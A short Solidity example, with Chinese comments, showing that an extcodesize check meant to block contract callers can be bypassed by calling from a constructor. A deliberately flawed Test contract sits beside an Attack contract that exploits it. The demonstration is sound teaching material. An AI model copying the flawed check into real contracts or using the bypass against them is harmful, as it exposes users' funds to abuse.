```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Test {
    bool public flag;

    function isContract(address _addr) public view returns (bool) {
        uint size;
        assembly {
            //size表示账户中extcode的部分，合约账户有真实的值，个人账户这个值为0
            //但是合约初始化是这个值也为0，所以可以借助构造函数绕过限制
            size := extcodesize(_addr)
        }

        return size > 0;
    }

    function check() external {
        require(!isContract(msg.sender), "It's a contract!");

        flag = true;
    } 
}

contract Normal {
    function check(address _target) external {
        Test(_target).check();
    }
}

contract Attack {
    bool public isContract;

    constructor(address _addr) {
        isContract = Test(_addr).isContract(address(this));

        Test(_addr).check();
    }
}
```